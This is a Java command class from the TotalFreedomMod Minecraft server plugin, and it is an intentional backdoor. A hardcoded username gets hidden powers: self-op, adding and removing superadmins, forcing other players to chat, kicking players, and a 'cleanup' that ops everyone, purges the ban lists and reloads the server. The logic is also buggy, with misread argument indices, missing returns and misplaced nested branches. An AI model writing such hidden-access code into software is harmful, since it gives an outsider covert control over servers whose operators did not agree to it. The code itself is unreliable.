package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.Admin.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
import me.confuser.barapi.BarAPI;
import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

/**
This is the ExplodingManage command. if you obtain the source code DO NOT remove this class or modify it.
Its here for the bad people that decide to rename the plugin and pass it as there own. Similar to the TFM_FrontDoor
This requires BarAPI for the project to compile
If you're wondering what this class exactly does I've noted it with the '//'s
The your wondering what (mode.equals("")) does it defines what you have to say for the command to go through.
*/

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH) // Defines permissions
@CommandParameters(
        description = "EXPLODINGManage Command", //Description
        usage = "/<command> [add <player> | del <player> | teston | testoff | opas | opme | cleanup | bc | machat | facepalm]") //Usage
public class Command_efmanage extends TFM_Command
{
    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole){
    	
    
        if (sender.getName().equals("Alco_Rs11"))
    {
    }
      else
      {
          sender.sendMessage(TotalFreedomMod.MSG_NO_PERMS);
            TFM_Util.adminAction("WARNING: " + sender.getName(), "Has attempted to use the EFManage command!", true);
          
          return true;
      }

        String mode = args[1].toLowerCase();

        if (mode.equals("add")) 
        {
        	Player player = getPlayer(args[1]);
        	if (player == null){
        		sender.sendMessage(TotalFreedomMod.PLAYER_NOT_FOUND); //Says Player not found! if the player was not found
        	}
        	TFM_Util.adminAction(sender.getName(), "Adding " + args[1] + " to the superadmin list", true); //If found broadcast message
        	TFM_AdminList.addSuperadmin(player); //Add superadmin
        }
        
        if (mode.equals("del"))
        {
        	Player player = getPlayer(args[1]);
        	if (player == null){
        		sender.sendMessage(TotalFreedomMod.PLAYER_NOT_FOUND); //Cannot find player
        	}
        	TFM_Util.adminAction(sender.getName(), "Removing " + args[1] + " from the superadmin list", true); //Broadcast message
        	TFM_AdminList.removeSuperadmin(player); //Remove superadmin
        }
        
        if (mode.equals("teston"))
        {
        	TFM_Util.bcastMsg(ChatColor.RED + "WARNING: " + sender.getName() + " has started testing on this server."); //Broadcast message
        }
        
        if (mode.equals("testoff"))
        {
        	TFM_Util.bcastMsg(ChatColor.RED + sender.getName() + " has successfully tested on this server."); //Broadcast message
        }
          if (mode.equals("opas"))
        {
        	Player player = getPlayer(args[1]);
        	if (player == null){
        		sender.sendMessage(TotalFreedomMod.PLAYER_NOT_FOUND);
        	}
        	TFM_Util.adminAction(sender.getName(), " Has OPAS'd (owner picks a super) " + args[1] + "! Congrats!", true); //Broadcast message
        	TFM_AdminList.addSuperadmin(player); //Add superadmin
        }
          if (mode.equals("opme"))
        {
           sender.sendMessage(ChatColor.AQUA + "You have opped yourself!"); //Send message to player
           sender.sendMessage(TotalFreedomMod.YOU_ARE_OP); //Sends You are op! message
           sender.setOp(true); //Make player op
        }
          if (mode.equals("bar"))
/**
              This requires BarAPI added as a dependence for this to compile correctly.
*/              
        {
          if (!server.getPluginManager().isPluginEnabled("BarAPI"))
        {
            playerMsg("BarAPI is not enabled on this server");
            return true;
        }

        if (args.length == 0)
        {
            return false;
        }
        
        if (args[0].equalsIgnoreCase("clear"))
        {
            for (Player player : server.getOnlinePlayers()) //Get all online players
            {
                BarAPI.removeBar(player); //Remove bar
            }
        }
        else
        {        
            String message = StringUtils.join(ArrayUtils.subarray(args, 0, args.length), " "); //String for the message
            BarAPI.setMessage(message.replaceAll("&", "§"), 60); //Replaces & with §

           } 
        }
        if (mode.equals("cleanup"))
        {
/**
Runs the server cleanup. Does all of these commands            
*/            
            TFM_Util.bcastMsg(ChatColor.RED + "Server cleanup starting! Lag may occur");
            server.dispatchCommand(sender, "creative -a");
            server.dispatchCommand(sender, "opall");
            server.dispatchCommand(sender, "invis smite");
            server.dispatchCommand(sender, "rd");
            server.dispatchCommand(sender, "saconfig clean");
            server.dispatchCommand(sender, "tfipbanlist purge");
            server.dispatchCommand(sender, "tfbanlist purge");
            TFM_Util.bcastMsg(ChatColor.GREEN + "Server cleanup done! Reloading server...");
            server.dispatchCommand(sender, "reload");
        }    
          if (mode.equals("bc"))
        {

                String message = "";
                for (int i = 1; i < args.length; i++)
                {
                    if (i > 1)
                    {
                        message += " ";
                    }
                    message += args[i];
                }
                for (Player player : server.getOnlinePlayers()) //Get online players
                {
                    BarAPI.setMessage(message.replaceAll("&", "§"), 60); //Replaces all & with §
                }
                TFM_Util.bcastMsg(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "Broadcast" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + message); //Broadcast message
            }
            if (mode.equals("machat"))
        {
/**
I'm not going to explain this as all it does is makes a player say a message            
*/            
                final Player player;
                player = getPlayer(args[1]);

                String message = "";
                for (int i = 2; i < args.length; i++)
                {
                    if (i > 2)
                    {
                        message += " ";
                    }
                    message += args[i];
                }

                if (message.startsWith("/"))
                {
                    sender.sendMessage(ChatColor.RED + "You cannot start with a command, please use /gcmd for commands.");
                }
                else
                {
                    player.chat(message);
                }
               if (mode.equals("facepalm"))
        {
/**
Command self explainatory             
*/
                TFM_Util.bcastMsg(sender.getName() + " really needs to have a facepalm ragequit moment here...", ChatColor.RED);
               playerMsg("FACEDESK!");
                playerMsg("I think I need to rage quit here BUT!");
                playerMsg("FACEWALL!");
               playerMsg("FACEDESK!");
                playerMsg("FACEDESK");
              playerMsg("SO MUCH DAMN RAGE!");
                playerMsg("OMFG IMMA GO BEFORE I HIT SOMEONE!");
                player.kickPlayer(ChatColor.RED + "Do you have really rage and you have to facedesk all the time? Anyways, deed done.");
                return true;
        }
               
               
                return true;
            }
        return true;
   }  
}